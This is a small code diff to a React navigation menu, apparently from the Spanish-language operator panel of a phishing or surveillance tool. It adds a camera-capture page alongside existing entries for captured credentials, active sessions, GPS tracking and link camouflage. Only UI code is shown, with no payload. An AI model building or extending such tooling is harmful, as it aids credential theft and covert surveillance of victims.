@@ -13,6 +13,7 @@ import {
   Link2,
   LogOut,
   Shield,
+  Camera,
 } from "lucide-react";
 import { useState } from "react";
 import { useAuth } from "@/context/AuthContext";
@@ -24,6 +25,7 @@ const navItems = [
   { href: "/captures", label: "Credenciales", icon: ListTodo },
   { href: "/sessions", label: "Sesiones Activas", icon: Terminal },
   { href: "/ubicacion", label: "Rastreo GPS", icon: Navigation },
+  { href: "/camara", label: "Captura de Cámara", icon: Camera },
   { href: "/links", label: "Camuflaje de Links", icon: Link2 },
 ];
 
